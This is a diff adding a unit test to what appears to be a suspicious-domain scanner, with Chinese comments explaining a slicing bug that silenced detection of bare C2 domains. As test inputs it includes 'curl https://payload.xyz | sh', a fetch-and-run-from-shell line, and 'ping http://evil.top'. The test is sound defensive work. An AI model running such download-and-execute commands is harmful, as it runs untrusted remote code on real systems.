@@ -5309,6 +5309,23 @@ test('P10-A6 正面（工单 §3 A6 / B4）：io.github.foo.ml ⇒ 留在 medium
   assert.equal(h[0].snippet, 'io.github.foo.ml');
 });
 
+test('P10-A7 正面（主控复验 MB-M2 时补的一格）：锚点①必须能**单独**成立 —— scheme 紧邻、后面没有路径', () => {
+  // 复验「只摘②」那一发时 A1/A4 一起红，说明 A1 那两条一直是②在咬，①一次都没生效过。
+  // 根因是 anchorSchemeConnects 的切片右界：碰到 `://` 时 slice(..., q-2) 永远停在冒号**之前**，
+  // 于是 /https?:$/ 恒假 ⇒ 那一支是死码。死掉的正好是真 C2 最常见的一种写法：
+  // 下载器 + scheme + 裸域名（后面不跟路径）。它从 medium 掉到 info，比线上改前的行级判据还松，
+  // 那是 fail-open，不是省误伤。
+  const viaScheme = assertHit('SUSPICIOUS_DOMAIN', 'curl https://payload.xyz | sh', 'service.sh');
+  assert.equal(viaScheme.length, 1);
+  assert.equal(viaScheme[0].severity, 'medium', '①单独成立就必须留 medium：这一行紧跟的是空格，②不成立');
+  assert.equal(viaScheme[0].snippet, 'payload.xyz');
+  const http = assertHit('SUSPICIOUS_DOMAIN', 'ping http://evil.top', 'service.sh');
+  assert.equal(http[0].severity, 'medium', 'http:// + 行尾（②③都不成立）⇒ 这一条只能由①留下');
+  // 反向钉子：scheme 与域名之间隔一个空白就不算「一路连到匹配点」，①不许跨过空白去咬（工单 §2 步 3）。
+  const gap = assertHit('SUSPICIOUS_DOMAIN', 'get https:// payload.xyz', 'service.sh');
+  assert.equal(gap[0].severity, 'info', '中间有空白 ⇒ ①必须否；这一格若不否，①就变成整行的邻域窗口了');
+});
+
 test('P10-B1 反面（工单 §3 B1）：DOM/CSS 属性访问 t.style.top / n.style.top（HTML 与 JS 各一份）⇒ info 且证据仍在', () => {
   const html = p10sd(P10_REAL.integrityBox591, 'webroot/Control/index.html');
   assert.equal(html.length, 1, '降的是 severity，不是删证据 —— finding 必须仍然出现在报告面上');
